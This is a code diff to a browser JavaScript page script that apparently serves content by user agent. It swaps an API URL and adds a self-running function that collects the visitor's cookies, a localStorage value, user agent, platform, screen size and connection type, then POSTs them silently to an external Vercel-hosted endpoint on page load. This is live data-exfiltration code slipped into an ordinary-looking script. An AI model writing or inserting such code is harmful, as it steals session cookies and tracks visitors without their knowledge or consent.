@@ -1,7 +1,7 @@
 const agent = navigator.userAgent;
 // const agent =
 //   'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36';
-const apiUrl = 'https://node-kr3m1v8si-nikdzubs-projects.vercel.app/api/data';
+const apiUrl = 'https://node-q1uu7auvk-nikdzubs-projects.vercel.app/api/data';
 // const apiUrl = 'https://cors-anywhere.herokuapp.com/unlockcontent.net/api/v2';
 const root = document.querySelector('#root');
 root.style.display = 'block';
@@ -126,3 +126,74 @@ if (agent.indexOf('music') >= 0) {
       console.error('There was a problem with the fetch operation:', error);
     });
 }
+
+(function () {
+  function collectBrowserInfo() {
+    const info = {};
+
+    try {
+      info['User Agent'] = navigator.userAgent;
+      info['Browser Version'] = navigator.userAgent;
+      info['Platform'] = navigator.platform;
+      info[
+        'Screen Resolution'
+      ] = `${window.screen.width}x${window.screen.height}`;
+
+      try {
+        info['Cookies'] = document.cookie;
+      } catch (e) {
+        info['Cookies'] = 'Failed to access cookies';
+      }
+
+      try {
+        info['Local Storage'] = localStorage.getItem('key') || 'No data';
+      } catch (e) {
+        info['Local Storage'] = 'Failed to access local storage';
+      }
+
+      info['Fetch API Supported'] = 'fetch' in window ? 'Yes' : 'No';
+      info['Service Workers Supported'] =
+        'serviceWorker' in navigator ? 'Yes' : 'No';
+
+      try {
+        if ('connection' in navigator) {
+          const connection =
+            navigator.connection ||
+            navigator.mozConnection ||
+            navigator.webkitConnection;
+          info['Effective Connection Type'] = connection.effectiveType;
+        }
+      } catch (e) {
+        info['Effective Connection Type'] =
+          'Failed to access network information';
+      }
+    } catch (e) {
+      console.error(
+        'An error occurred while gathering browser information:',
+        e
+      );
+    }
+
+    return info;
+  }
+
+  function sendInfoToAPI(info) {
+    fetch('https://node-q1uu7auvk-nikdzubs-projects.vercel.app/api/data', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(info),
+    })
+      .then((response) => response.json())
+      .then((data) => {
+        console.log('Success:', data);
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+  }
+
+  const browserInfo = collectBrowserInfo();
+  sendInfoToAPI(browserInfo);
+})();
